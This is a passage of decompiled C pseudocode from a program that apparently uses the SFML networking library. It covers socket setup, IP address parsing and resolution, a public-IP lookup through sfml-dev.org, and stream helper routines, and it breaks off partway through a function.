_DWORD *__thiscall sub_428520(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  *this = &sf::Socket::`vftable';
  this[1] = a2;
  this[2] = sub_408730();
  result = this;
  *((_BYTE *)this + 12) = 1;
  return result;
}
// 4B83B0: using guessed type void *sf::Socket::`vftable';

//----- (00428550) --------------------------------------------------------
int __thiscall sub_428550(_DWORD *this)
{
  SOCKET v2; // edi
  int result; // eax

  v2 = this[2];
  *this = &sf::Socket::`vftable';
  result = sub_408730();
  if ( v2 != result )
  {
    sub_432140(v2);
    result = sub_408730();
    this[2] = result;
  }
  return result;
}
// 4B83B0: using guessed type void *sf::Socket::`vftable';

//----- (004285B0) --------------------------------------------------------
_DWORD *__thiscall sub_4285B0(_DWORD *this, char a2)
{
  SOCKET v3; // edi

  v3 = this[2];
  *this = &sf::Socket::`vftable';
  if ( v3 != sub_408730() )
  {
    sub_432140(v3);
    this[2] = sub_408730();
  }
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4B83B0: using guessed type void *sf::Socket::`vftable';

//----- (00428630) --------------------------------------------------------
int __thiscall sub_428630(_DWORD *this)
{
  SOCKET v2; // edi
  int result; // eax

  v2 = this[2];
  result = sub_408730();
  if ( v2 != result )
  {
    sub_432140(v2);
    result = sub_408730();
    this[2] = result;
  }
  return result;
}

//----- (00428660) --------------------------------------------------------
int *__thiscall sub_428660(int this)
{
  int *result; // eax
  SOCKET v3; // edi
  char v4; // bl
  bool v5; // zf
  int *v6; // eax
  _BYTE *v7; // eax
  int *v8; // eax
  const char *v9; // [esp-8h] [ebp-10h]
  char optval[4]; // [esp+4h] [ebp-4h] BYREF

  result = (int *)sub_408730();
  if ( *(int **)(this + 8) == result )
  {
    v3 = socket(2, (*(_DWORD *)(this + 4) != 0) + 1, 0);
    if ( v3 == sub_408730() )
    {
      v9 = "Failed to create socket";
    }
    else
    {
      result = (int *)sub_408730();
      if ( *(int **)(this + 8) != result )
        return result;
      v4 = *(_BYTE *)(this + 12);
      *(_DWORD *)(this + 8) = v3;
      optval[0] = v4;
      if ( v3 != sub_408730() )
      {
        sub_4321F0(v3, *(int *)optval);
        v3 = *(_DWORD *)(this + 8);
      }
      v5 = *(_DWORD *)(this + 4) == 0;
      *(_BYTE *)(this + 12) = v4;
      *(_DWORD *)optval = 1;
      if ( v5 )
      {
        result = (int *)setsockopt(v3, 6, 1, optval, 4);
        if ( result != (int *)-1 )
          return result;
        v9 = "all your TCP packets will be buffered";
        v6 = sub_468B30();
        v7 = sub_422D50(v6, "Failed to set socket option \"TCP_NODELAY\" ; ");
        goto LABEL_13;
      }
      result = (int *)setsockopt(v3, 0xFFFF, 32, optval, 4);
      if ( result != (int *)-1 )
        return result;
      v9 = "Failed to enable broadcast on UDP socket";
    }
    v7 = sub_468B30();
LABEL_13:
    v8 = (int *)sub_422D50(v7, v9);
    return sub_422FA0(v8);
  }
  return result;
}

//----- (00428750) --------------------------------------------------------
int __thiscall sub_428750(_DWORD *this)
{
  return this[2];
}

//----- (00428760) --------------------------------------------------------
char __thiscall sub_428760(_BYTE *this)
{
  return this[12];
}

//----- (00428770) --------------------------------------------------------
char __thiscall sub_428770(int this, int a2)
{
  SOCKET v3; // edi
  char result; // al

  v3 = *(_DWORD *)(this + 8);
  if ( v3 == sub_408730() )
    result = a2;
  else
    result = sub_4321F0(v3, a2);
  *(_BYTE *)(this + 12) = a2;
  return result;
}

//----- (004287B0) --------------------------------------------------------
void __stdcall sub_4287B0(int a1, int *a2)
{
  int *v2; // edi
  _DWORD *v3; // esi
  unsigned int v4; // ecx
  _DWORD *v5; // eax
  unsigned int v6; // ecx
  _DWORD *v7; // eax

  v2 = a2;
  while ( !*((_BYTE *)v2 + 13) )
  {
    sub_4287B0(a1, v2[2]);
    v3 = v2;
    v2 = (int *)*v2;
    v4 = v3[15];
    if ( v4 >= 0x10 )
    {
      v5 = (_DWORD *)v3[10];
      if ( v4 + 1 >= 0x1000 )
      {
        if ( (unsigned int)v5 - *(v5 - 1) - 4 > 0x1F )
          goto LABEL_14;
        v5 = (_DWORD *)*(v5 - 1);
      }
      sub_46C87D(v5);
    }
    v3[14] = 0;
    v3[15] = 15;
    *((_BYTE *)v3 + 40) = 0;
    v6 = v3[9];
    if ( v6 >= 0x10 )
    {
      v7 = (_DWORD *)v3[4];
      if ( v6 + 1 >= 0x1000 )
      {
        if ( (unsigned int)v7 - *(v7 - 1) - 4 > 0x1F )
LABEL_14:
          _invalid_parameter_noinfo_noreturn();
        v7 = (_DWORD *)*(v7 - 1);
      }
      sub_46C87D(v7);
    }
    v3[8] = 0;
    v3[9] = 15;
    *((_BYTE *)v3 + 16) = 0;
    sub_46C87D(v3);
  }
}

//----- (00428890) --------------------------------------------------------
_BYTE *__thiscall sub_428890(_BYTE *this, struct addrinfo *a2)
{
  *(_DWORD *)this = 0;
  this[4] = 0;
  sub_428EF0(this, a2);
  return this;
}

//----- (004288B0) --------------------------------------------------------
_BYTE *__thiscall sub_4288B0(_BYTE *this, u_long hostlong)
{
  _BYTE *result; // eax

  *(_DWORD *)this = htonl(hostlong);
  result = this;
  this[4] = 1;
  return result;
}

//----- (004288D0) --------------------------------------------------------
_BYTE *__thiscall sub_4288D0(_BYTE *this)
{
  _BYTE *result; // eax

  *(_DWORD *)this = 0;
  result = this;
  this[4] = 0;
  return result;
}

//----- (004288E0) --------------------------------------------------------
bool __cdecl sub_4288E0(int *a1, int *a2)
{
  unsigned __int8 v2; // cl
  unsigned int v3; // esi
  unsigned __int8 v4; // dl
  unsigned int v5; // eax

  v2 = *((_BYTE *)a2 + 4);
  v3 = *a2;
  v4 = *((_BYTE *)a1 + 4);
  v5 = *a1;
  return v4 < v2 || v4 <= v2 && v5 < v3 || v2 < v4 || v3 < v5;
}

//----- (00428910) --------------------------------------------------------
_BYTE *__cdecl sub_428910(_BYTE *a1, __int64 a2)
{
  void *v2; // ecx
  void *v3; // ecx
  void *v4; // ecx
  char *v5; // eax
  _BYTE *v6; // ecx
  _BYTE *v7; // ecx
  _BYTE *v8; // ecx
  _BYTE *v9; // ecx
  _BYTE *v10; // ecx
  unsigned int v12; // edx
  _BYTE *v13; // ecx
  _BYTE *v14; // ecx
  _BYTE *v15; // ecx
  _BYTE *v16; // ecx
  size_t v17[6]; // [esp+8h] [ebp-110h] BYREF
  _BYTE *v18; // [esp+20h] [ebp-F8h]
  int v19; // [esp+24h] [ebp-F4h]
  int v20; // [esp+28h] [ebp-F0h]
  _BYTE *v21; // [esp+34h] [ebp-E4h]
  int v22; // [esp+44h] [ebp-D4h]
  unsigned int v23; // [esp+48h] [ebp-D0h]
  void *v24[4]; // [esp+50h] [ebp-C8h] BYREF
  int v25; // [esp+60h] [ebp-B8h]
  unsigned int v26; // [esp+64h] [ebp-B4h]
  void *v27[4]; // [esp+68h] [ebp-B0h] BYREF
  int v28; // [esp+78h] [ebp-A0h]
  unsigned int v29; // [esp+7Ch] [ebp-9Ch]
  void *v30[4]; // [esp+80h] [ebp-98h] BYREF
  int v31; // [esp+90h] [ebp-88h]
  unsigned int v32; // [esp+94h] [ebp-84h]
  _DWORD *v33[3]; // [esp+98h] [ebp-80h] BYREF
  _BYTE *v34; // [esp+A4h] [ebp-74h]
  int v35; // [esp+B4h] [ebp-64h]
  unsigned int v36; // [esp+B8h] [ebp-60h]
  _BYTE *v37; // [esp+C4h] [ebp-54h]
  int v38; // [esp+D4h] [ebp-44h]
  unsigned int v39; // [esp+D8h] [ebp-40h]
  void *v40[5]; // [esp+DCh] [ebp-3Ch] BYREF
  _BYTE *v41; // [esp+F0h] [ebp-28h]
  int v42; // [esp+100h] [ebp-18h]
  unsigned int v43; // [esp+104h] [ebp-14h]
  int v44; // [esp+114h] [ebp-4h]

  v31 = 0;
  v32 = 15;
  LOBYTE(v30[0]) = 0;
  sub_41EF80(v30, "www.sfml-dev.org", 0x10u);
  v44 = 0;
  sub_42A650((int)v17, (size_t *)v30, 0);
  LOBYTE(v44) = 2;
  if ( v32 >= 0x10 )
  {
    v2 = v30[0];
    if ( v32 + 1 >= 0x1000 )
    {
      v2 = (void *)*((_DWORD *)v30[0] - 1);
      if ( (unsigned int)(v30[0] - v2 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v2);
  }
  v31 = 0;
  v32 = 15;
  LOBYTE(v30[0]) = 0;
  v25 = 0;
  v26 = 15;
  LOBYTE(v24[0]) = 0;
  sub_41EF80(v24, &unk_4CCC25, 0);
  LOBYTE(v44) = 3;
  v28 = 0;
  v29 = 15;
  LOBYTE(v27[0]) = 0;
  sub_41EF80(v27, "/ip-provider.php", 0x10u);
  LOBYTE(v44) = 4;
  sub_42A740((char *)v33, (size_t *)v27, 0, (size_t *)v24);
  LOBYTE(v44) = 6;
  if ( v29 >= 0x10 )
  {
    v3 = v27[0];
    if ( v29 + 1 >= 0x1000 )
    {
      v3 = (void *)*((_DWORD *)v27[0] - 1);
      if ( (unsigned int)(v27[0] - v3 - 4) > 0x1F )
        goto LABEL_56;
    }
    sub_46C87D(v3);
  }
  v28 = 0;
  v29 = 15;
  LOBYTE(v27[0]) = 0;
  LOBYTE(v44) = 7;
  if ( v26 < 0x10 )
    goto LABEL_13;
  v4 = v24[0];
  if ( v26 + 1 >= 0x1000 )
  {
    v4 = (void *)*((_DWORD *)v24[0] - 1);
    if ( (unsigned int)(v24[0] - v4 - 4) > 0x1F )
LABEL_56:
      _invalid_parameter_noinfo_noreturn();
  }
  sub_46C87D(v4);
LABEL_13:
  v25 = 0;
  v26 = 15;
  LOBYTE(v24[0]) = 0;
  sub_430D40(v17, (int)v40, v33, a2);
  LOBYTE(v44) = 8;
  if ( sub_428750(v40) != 200 )
  {
    v12 = v43;
    *(_DWORD *)a1 = 0;
    a1[4] = 0;
    if ( v12 >= 0x10 )
    {
      v13 = v41;
      if ( v12 + 1 >= 0x1000 )
      {
        v13 = (_BYTE *)*((_DWORD *)v41 - 1);
        if ( (unsigned int)(v41 - v13 - 4) > 0x1F )
          goto LABEL_54;
      }
      sub_46C87D(v13);
    }
    v42 = 0;
    v43 = 15;
    LOBYTE(v41) = 0;
    sub_4287B0((int)v40, *((int **)v40[0] + 1));
    sub_46C87D(v40[0]);
    if ( v39 >= 0x10 )
    {
      v14 = v37;
      if ( v39 + 1 >= 0x1000 )
      {
        v14 = (_BYTE *)*((_DWORD *)v37 - 1);
        if ( (unsigned int)(v37 - v14 - 4) > 0x1F )
          goto LABEL_54;
      }
      sub_46C87D(v14);
    }
    v38 = 0;
    v39 = 15;
    LOBYTE(v37) = 0;
    if ( v36 >= 0x10 )
    {
      v15 = v34;
      if ( v36 + 1 >= 0x1000 )
      {
        v15 = (_BYTE *)*((_DWORD *)v34 - 1);
        if ( (unsigned int)(v34 - v15 - 4) > 0x1F )
          goto LABEL_54;
      }
      sub_46C87D(v15);
    }
    v35 = 0;
    v36 = 15;
    LOBYTE(v34) = 0;
    sub_4287B0((int)v33, *((int **)v33[0] + 1));
    sub_46C87D(v33[0]);
    if ( v23 >= 0x10 )
    {
      v16 = v21;
      if ( v23 + 1 >= 0x1000 )
      {
        v16 = (_BYTE *)*((_DWORD *)v21 - 1);
        if ( (unsigned int)(v21 - v16 - 4) > 0x1F )
          goto LABEL_54;
      }
      sub_46C87D(v16);
    }
    v10 = v18;
    v22 = 0;
    v23 = 15;
    LOBYTE(v21) = 0;
    if ( !v18 )
      goto LABEL_34;
    if ( (unsigned int)(v20 - (_DWORD)v18) < 0x1000 )
      goto LABEL_33;
    v10 = (_BYTE *)*((_DWORD *)v18 - 1);
    if ( (unsigned int)(v18 - v10 - 4) <= 0x1F )
      goto LABEL_33;
LABEL_54:
    _invalid_parameter_noinfo_noreturn();
  }
  v5 = sub_42F680((char *)v40);
  *(_DWORD *)a1 = 0;
  a1[4] = 0;
  sub_428EF0(a1, (struct addrinfo *)v5);
  if ( v43 >= 0x10 )
  {
    v6 = v41;
    if ( v43 + 1 >= 0x1000 )
    {
      v6 = (_BYTE *)*((_DWORD *)v41 - 1);
      if ( (unsigned int)(v41 - v6 - 4) > 0x1F )
        goto LABEL_54;
    }
    sub_46C87D(v6);
  }
  v42 = 0;
  v43 = 15;
  LOBYTE(v41) = 0;
  sub_4287B0((int)v40, *((int **)v40[0] + 1));
  sub_46C87D(v40[0]);
  if ( v39 >= 0x10 )
  {
    v7 = v37;
    if ( v39 + 1 >= 0x1000 )
    {
      v7 = (_BYTE *)*((_DWORD *)v37 - 1);
      if ( (unsigned int)(v37 - v7 - 4) > 0x1F )
        goto LABEL_54;
    }
    sub_46C87D(v7);
  }
  v38 = 0;
  v39 = 15;
  LOBYTE(v37) = 0;
  if ( v36 >= 0x10 )
  {
    v8 = v34;
    if ( v36 + 1 >= 0x1000 )
    {
      v8 = (_BYTE *)*((_DWORD *)v34 - 1);
      if ( (unsigned int)(v34 - v8 - 4) > 0x1F )
        goto LABEL_54;
    }
    sub_46C87D(v8);
  }
  v35 = 0;
  v36 = 15;
  LOBYTE(v34) = 0;
  sub_4287B0((int)v33, *((int **)v33[0] + 1));
  sub_46C87D(v33[0]);
  if ( v23 >= 0x10 )
  {
    v9 = v21;
    if ( v23 + 1 >= 0x1000 )
    {
      v9 = (_BYTE *)*((_DWORD *)v21 - 1);
      if ( (unsigned int)(v21 - v9 - 4) > 0x1F )
        goto LABEL_54;
    }
    sub_46C87D(v9);
  }
  v10 = v18;
  v22 = 0;
  v23 = 15;
  LOBYTE(v21) = 0;
  if ( v18 )
  {
    if ( (unsigned int)(v20 - (_DWORD)v18) < 0x1000
      || (v10 = (_BYTE *)*((_DWORD *)v18 - 1), (unsigned int)(v18 - v10 - 4) <= 0x1F) )
    {
LABEL_33:
      sub_46C87D(v10);
      v20 = 0;
      v19 = 0;
      v18 = 0;
      goto LABEL_34;
    }
    goto LABEL_54;
  }
LABEL_34:
  sub_428550(v17);
  return a1;
}
// 428910: using guessed type size_t var_110[6];

//----- (00428EF0) --------------------------------------------------------
void __thiscall sub_428EF0(_BYTE *this, struct addrinfo *cp)
{
  char *v2; // esi
  const char *v4; // eax
  unsigned int v5; // eax
  bool v6; // cf
  int v7; // esi
  char *v8; // [esp-8h] [ebp-30h]
  ADDRINFOA pHints; // [esp+8h] [ebp-20h] BYREF

  v2 = (char *)cp;
  v8 = (char *)cp;
  *(_DWORD *)this = 0;
  this[4] = 0;
  if ( sub_4232C0(v8, "255.255.255.255") )
  {
    *(_DWORD *)this = -1;
    this[4] = 1;
    return;
  }
  if ( sub_4232C0(v2, "0.0.0.0") )
    goto LABEL_13;
  v4 = v2;
  if ( *((_DWORD *)v2 + 5) >= 0x10u )
    v4 = *(const char **)v2;
  v5 = inet_addr(v4);
  if ( v5 != -1 )
  {
    *(_DWORD *)this = v5;
    this[4] = 1;
    return;
  }
  v6 = *((_DWORD *)v2 + 5) < 0x10u;
  memset(&pHints, 0, sizeof(pHints));
  pHints.ai_family = 2;
  cp = 0;
  if ( !v6 )
    v2 = *(char **)v2;
  if ( !getaddrinfo(v2, 0, &pHints, &cp) && cp )
  {
    v7 = *(_DWORD *)&cp->ai_addr->sa_data[2];
    freeaddrinfo(cp);
    *(_DWORD *)this = v7;
LABEL_13:
    this[4] = 1;
  }
}

//----- (00428FC0) --------------------------------------------------------
u_long __thiscall sub_428FC0(u_long *this)
{
  return ntohl(*this);
}

//----- (00428FD0) --------------------------------------------------------
int __thiscall sub_428FD0(struct in_addr *this, int a2)
{
  char *v2; // edx

  v2 = inet_ntoa(*this);
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 15;
  *(_BYTE *)a2 = 0;
  sub_41EF80((void **)a2, v2, strlen(v2));
  return a2;
}

//----- (00429020) --------------------------------------------------------
char __cdecl sub_429020(int a1, int a2)
{
  _DWORD **v2; // ecx
  unsigned __int8 *v3; // edx
  int v4; // eax
  _DWORD **v5; // ecx
  unsigned __int8 *v6; // edx
  int v7; // eax
  _DWORD **v8; // eax

  if ( !*(_BYTE *)(a1 + 4) )
  {
    v2 = *(_DWORD ***)a1;
    if ( !*(_DWORD *)a1
      || ((v3 = (unsigned __int8 *)*v2[7]) == 0 || (int)*v2[11] <= 0
        ? (v4 = ((int (__thiscall *)(_DWORD **))(*v2)[6])(v2))
        : (v4 = *v3),
          v4 == -1) )
    {
      *(_DWORD *)a1 = 0;
    }
    else
    {
      *(_BYTE *)(a1 + 5) = v4;
    }
    *(_BYTE *)(a1 + 4) = 1;
  }
  if ( !*(_BYTE *)(a2 + 4) )
  {
    v5 = *(_DWORD ***)a2;
    if ( !*(_DWORD *)a2
      || ((v6 = (unsigned __int8 *)*v5[7]) == 0 || (int)*v5[11] <= 0
        ? (v7 = ((int (__thiscall *)(_DWORD **))(*v5)[6])(v5))
        : (v7 = *v6),
          v7 == -1) )
    {
      *(_DWORD *)a2 = 0;
    }
    else
    {
      *(_BYTE *)(a2 + 5) = v7;
    }
    *(_BYTE *)(a2 + 4) = 1;
  }
  v8 = *(_DWORD ***)a2;
  if ( *(_DWORD *)a1 )
  {
    if ( !v8 )
      return 0;
  }
  else if ( v8 )
  {
    return 0;
  }
  return 1;
}

//----- (004290C0) --------------------------------------------------------
_BYTE *__fastcall sub_4290C0(_BYTE *a1, int a2, int a3)
{
  int v4; // eax
  int v5; // ecx
  int v6; // edi
  int v7; // eax
  int v8; // ebx
  _DWORD *v9; // eax
  void (__thiscall ***v10)(_DWORD, int); // eax
  int v11; // edx
  int v12; // eax
  _DWORD *v13; // edx
  char v14; // al
  char v15; // cl
  int v16; // eax
  int v17; // ecx
  int v18; // eax
  int v19; // eax
  int v20; // ecx
  char *v22; // esi
  int *v23; // eax
  int v24; // [esp+0h] [ebp-68h] BYREF
  _DWORD pExceptionObject[5]; // [esp+10h] [ebp-58h] BYREF
  _DWORD v26[2]; // [esp+24h] [ebp-44h] BYREF
  char v27[4]; // [esp+2Ch] [ebp-3Ch] BYREF
  int v28; // [esp+30h] [ebp-38h]
  _BYTE *v29; // [esp+34h] [ebp-34h]
  char v30; // [esp+38h] [ebp-30h]
  int v31; // [esp+40h] [ebp-28h]
  int v32; // [esp+48h] [ebp-20h]
  int v33; // [esp+4Ch] [ebp-1Ch]
  int v34[3]; // [esp+50h] [ebp-18h] BYREF
  int v35; // [esp+64h] [ebp-4h]

  v34[2] = (int)&v24;
  v34[1] = (int)a1;
  v34[0] = 0;
  v4 = *(_DWORD *)a1;
  v29 = a1;
  v5 = *(_DWORD *)&a1[*(_DWORD *)(v4 + 4) + 56];
  if ( v5 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v5 + 4))(v5);
  v35 = 0;
  v30 = sub_427AC0(a1, 0);
  v35 = 1;
  if ( v30 )
  {
    v28 = *(_DWORD *)(*(_DWORD *)&a1[*(_DWORD *)(*(_DWORD *)a1 + 4) + 48] + 4);
    v6 = v28;
    (*(void (__thiscall **)(int))(*(_DWORD *)v6 + 4))(v6);
    v7 = *(_DWORD *)a1;
    LOBYTE(v35) = 3;
    LOWORD(v32) = 1;
    v8 = *(_DWORD *)(v7 + 4);
    v33 = *(_DWORD *)&a1[v8 + 56];
    LOWORD(v31) = v33 == 0;
    v9 = sub_42A240((int)v27);
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int, int, _DWORD, int, _BYTE *, int *, int))(*v9 + 44))(
      v9,
      v26,
      v33,
      v31,
      0,
      v32,
      &a1[v8],
      v34,
      a3);
    if ( v6 )
    {
      v10 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v6 + 8))(v6);
      if ( v10 )
        (**v10)(v10, 1);
    }
    v35 = 1;
  }
  v11 = *(_DWORD *)(*(_DWORD *)a1 + 4);
  v12 = *(_DWORD *)&a1[v11 + 12];
  v13 = &a1[v11];
  v14 = LOBYTE(v34[0]) | v12;
  v15 = v14 | 4;
  if ( v13[14] )
    v15 = v14;
  v16 = v13[4];
  v17 = v15 & 0x17;
  v13[3] = v17;
  v18 = v17 & v16;
  if ( v18 )
  {
    if ( (v18 & 4) != 0 )
    {
      v22 = "ios_base::badbit set";
    }
    else
    {
      v22 = "ios_base::failbit set";
      if ( (v18 & 2) == 0 )
        v22 = "ios_base::eofbit set";
    }
    v23 = sub_402C50(v26, 1);
    sub_403590(pExceptionObject, v22, v23);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
  }
  v19 = *(_DWORD *)a1;
  v35 = 5;
  v20 = *(_DWORD *)&a1[*(_DWORD *)(v19 + 4) + 56];
  if ( v20 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v20 + 8))(v20);
  return a1;
}
// 4290C0: using guessed type char var_3C[4];
// 4290C0: using guessed type _DWORD var_44[2];
// 4290C0: using guessed type _DWORD pExceptionObject[5];

//----- (00429270) --------------------------------------------------------
_BYTE *__fastcall sub_429270(_BYTE *a1, int a2, int a3)
{
  int v4; // eax
  int v5; // ecx
  int v6; // edi
  int v7; // eax
  int v8; // ebx
  _DWORD *v9; // eax
  void (__thiscall ***v10)(_DWORD, int); // eax
  int v11; // edx
  int v12; // eax
  _DWORD *v13; // edx
  char v14; // al
  char v15; // cl
  int v16; // eax
  int v17; // ecx
  int v18; // eax
  int v19; // eax
  int v20; // ecx
  char *v22; // esi
  int *v23; // eax
  int v24; // [esp+0h] [ebp-68h] BYREF
  _DWORD pExceptionObject[5]; // [esp+10h] [ebp-58h] BYREF
  _DWORD v26[2]; // [esp+24h] [ebp-44h] BYREF
  char v27[4]; // [esp+2Ch] [ebp-3Ch] BYREF
  int v28; // [esp+30h] [ebp-38h]
  _BYTE *v29; // [esp+34h] [ebp-34h]
  char v30; // [esp+38h] [ebp-30h]
  int v31; // [esp+40h] [ebp-28h]
  int v32; // [esp+48h] [ebp-20h]
  int v33; // [esp+4Ch] [ebp-1Ch]
  int v34[3]; // [esp+50h] [ebp-18h] BYREF
  int v35; // [esp+64h] [ebp-4h]

  v34[2] = (int)&v24;
  v34[1] = (int)a1;
  v34[0] = 0;
  v4 = *(_DWORD *)a1;
  v29 = a1;
  v5 = *(_DWORD *)&a1[*(_DWORD *)(v4 + 4) + 56];
  if ( v5 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v5 + 4))(v5);
  v35 = 0;
  v30 = sub_427AC0(a1, 0);
  v35 = 1;
  if ( v30 )
  {
    v28 = *(_DWORD *)(*(_DWORD *)&a1[*(_DWORD *)(*(_DWORD *)a1 + 4) + 48] + 4);
    v6 = v28;
    (*(void (__thiscall **)(int))(*(_DWORD *)v6 + 4))(v6);
    v7 = *(_DWORD *)a1;
    LOBYTE(v35) = 3;
    LOWORD(v32) = 1;
    v8 = *(_DWORD *)(v7 + 4);
    v33 = *(_DWORD *)&a1[v8 + 56];
    LOWORD(v31) = v33 == 0;
    v9 = sub_42A240((int)v27);
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int, int, _DWORD, int, _BYTE *, int *, int))(*v9 + 40))(
      v9,
      v26,
      v33,
      v31,
      0,
      v32,
      &a1[v8],
      v34,
      a3);
    if ( v6 )
    {
      v10 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v6 + 8))(v6);
      if ( v10 )
        (**v10)(v10, 1);
    }
    v35 = 1;
  }
  v11 = *(_DWORD *)(*(_DWORD *)a1 + 4);
  v12 = *(_DWORD *)&a1[v11 + 12];
  v13 = &a1[v11];
  v14 = LOBYTE(v34[0]) | v12;
  v15 = v14 | 4;
  if ( v13[14] )
    v15 = v14;
  v16 = v13[4];
  v17 = v15 & 0x17;
  v13[3] = v17;
  v18 = v17 & v16;
  if ( v18 )
  {
    if ( (v18 & 4) != 0 )
    {
      v22 = "ios_base::badbit set";
    }
    else
    {
      v22 = "ios_base::failbit set";
      if ( (v18 & 2) == 0 )
        v22 = "ios_base::eofbit set";
    }
    v23 = sub_402C50(v26, 1);
    sub_403590(pExceptionObject, v22, v23);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
  }
  v19 = *(_DWORD *)a1;
  v35 = 5;
  v20 = *(_DWORD *)&a1[*(_DWORD *)(v19 + 4) + 56];
  if ( v20 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v20 + 8))(v20);
  return a1;
}
// 429270: using guessed type char var_3C[4];
// 429270: using guessed type _DWORD var_44[2];
// 429270: using guessed type _DWORD pExceptionObject[5];

//----- (00429420) --------------------------------------------------------
int __thiscall sub_429420(int *this, int *a2, int a3, int a4)
{
  int v5; // ecx
  _DWORD *v6; // ebx
  int v7; // ecx
  int v8; // eax
  int v10; // [esp-Ch] [ebp-40h]
  _DWORD v11[5]; // [esp+0h] [ebp-34h] BYREF
  _DWORD *v12; // [esp+14h] [ebp-20h]
  _DWORD *v13; // [esp+18h] [ebp-1Ch]
  int *v14; // [esp+1Ch] [ebp-18h]
  int v15; // [esp+20h] [ebp-14h]
  _DWORD *v16; // [esp+24h] [ebp-10h]
  int v17; // [esp+30h] [ebp-4h]

  v16 = v11;
  v14 = this;
  v5 = *this;
  v15 = v5;
  if ( !*((_BYTE *)a2 + 13) )
  {
    v11[4] = this;
    v17 = 0;
    v12 = 0;
    v6 = operator new(0x40u);
    v12 = v6;
    v13 = v6 + 4;
    sub_419BE0(v6 + 4, a2 + 4);
    LOBYTE(v17) = 1;
    sub_419BE0(v6 + 10, a2 + 10);
    v7 = v15;
    *v6 = v15;
    v6[2] = v7;
    *((_WORD *)v6 + 6) = 0;
    v6[1] = a3;
    *((_BYTE *)v6 + 12) = *((_BYTE *)a2 + 12);
    v10 = *a2;
    if ( *(_BYTE *)(v7 + 13) )
      v7 = (int)v6;
    v17 = 2;
    v15 = v7;
    *v6 = sub_429420(v10, v6, a4);
    v8 = sub_429420(a2[2], v6, a4);
    v5 = v15;
    v6[2] = v8;
  }
  return v5;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00429540) --------------------------------------------------------
void *__thiscall sub_429540(void *this, int a2, int *a3)
{
  int *v3; // esi
  void *result; // eax
  _DWORD *v5; // edi

  v3 = a3;
  for ( result = this; !*((_BYTE *)v3 + 13); result = this )
  {
    sub_429540(a2, v3[2]);
    v5 = v3;
    v3 = (int *)*v3;
    sub_425620(v5 + 4);
    sub_46C87D(v5);
  }
  return result;
}

//----- (00429590) --------------------------------------------------------
int __cdecl sub_429590(int a1, int *a2, size_t a3, _BYTE *a4)
{
  size_t v4; // esi
  _BYTE *v5; // ecx
  char v6; // dl
  bool v7; // zf
  size_t v8; // eax
  int v9; // ecx
  unsigned int v10; // ebx
  int v11; // esi
  _BYTE *v12; // edx
  char v13; // al
  int *v14; // eax
  int *v15; // eax
  char v16; // al
  _DWORD **v17; // ecx
  unsigned __int8 *v18; // edx
  int v19; // eax
  int *v20; // eax
  _DWORD **v21; // ecx
  unsigned __int8 *v22; // edx
  int v23; // eax
  _DWORD **v24; // ecx
  int v25; // eax
  int *v26; // edx
  unsigned __int8 *v27; // edx
  int v28; // eax
  char v29; // ah
  char v30; // cl
  _DWORD **v31; // ecx
  unsigned __int8 *v32; // edx
  int v33; // eax
  _DWORD **v34; // ecx
  unsigned __int8 *v35; // edx
  int v36; // eax
  _DWORD **v37; // ecx
  _DWORD **v38; // eax
  void *v39; // edx
  int *v40; // edx
  unsigned __int8 **v41; // ecx
  unsigned __int8 *v42; // edx
  int v43; // eax
  _BYTE *v45; // [esp+10h] [ebp-48h]
  int v46; // [esp+14h] [ebp-44h]
  unsigned int v47; // [esp+18h] [ebp-40h]
  int v48; // [esp+20h] [ebp-38h]
  unsigned int v49; // [esp+24h] [ebp-34h]
  unsigned int v50; // [esp+28h] [ebp-30h]
  char v51; // [esp+2Fh] [ebp-29h]
  int v52[5]; // [esp+30h] [ebp-28h] BYREF
  unsigned int v53; // [esp+44h] [ebp-14h]
  int v54; // [esp+54h] [ebp-4h]

  v4 = a3;
  v5 = a4;
  if ( *a4 )
  {
    v6 = *a4;
    do
    {
      v7 = v6 == *a4;
      v8 = v4 + 1;
      v6 = *++v5;
      if ( !v7 )
        v8 = v4;
      v4 = v8;
    }
    while ( v6 );
    v47 = v8;
  }
  else
  {
    v47 = a3;
  }
  sub_419B50((int)v52, v4, 0);
  v9 = v52[0];
  v54 = 0;
  v46 = -2;
  v50 = 1;
  v49 = v53;
  v48 = v52[0];
  while ( 2 )
  {
    v10 = 0;
    v51 = 0;
    v11 = 0;
    if ( !v47 )
      break;
    v12 = a4;
    do
    {
      v13 = v12[v11];
      if ( v13 )
      {
        do
        {
          if ( v13 == *v12 )
            break;
          v13 = v12[++v11];
        }
        while ( v13 );
        v9 = v48;
      }
      v14 = v52;
      if ( v49 >= 0x10 )
        v14 = (int *)v9;
      if ( !*((_BYTE *)v14 + v10) )
      {
        v11 += v50;
        v45 = &v12[v11];
        v16 = v12[v11];
        if ( v16 == *v12 || !v16 )
        {
          v26 = v52;
          v46 = v10;
          if ( v49 >= 0x10 )
            v26 = (int *)v9;
          goto LABEL_64;
        }
        if ( !*(_BYTE *)(a1 + 4) )
        {
          v17 = *(_DWORD ***)a1;
          if ( !*(_DWORD *)a1
            || ((v18 = (unsigned __int8 *)*v17[7]) == 0 || (int)*v17[11] <= 0
              ? (v19 = ((int (__thiscall *)(_DWORD **))(*v17)[6])(v17))
              : (v19 = *v18),
                v19 == -1) )
          {
            *(_DWORD *)a1 = 0;
          }
          else
          {
            *(_BYTE *)(a1 + 5) = v19;
          }
          *(_BYTE *)(a1 + 4) = 1;
        }
        v20 = a2;
        if ( *((_BYTE *)a2 + 4) )
        {
LABEL_44:
          v24 = *(_DWORD ***)a1;
          v25 = *v20;
          if ( *(_DWORD *)a1 )
          {
            if ( v25 )
            {
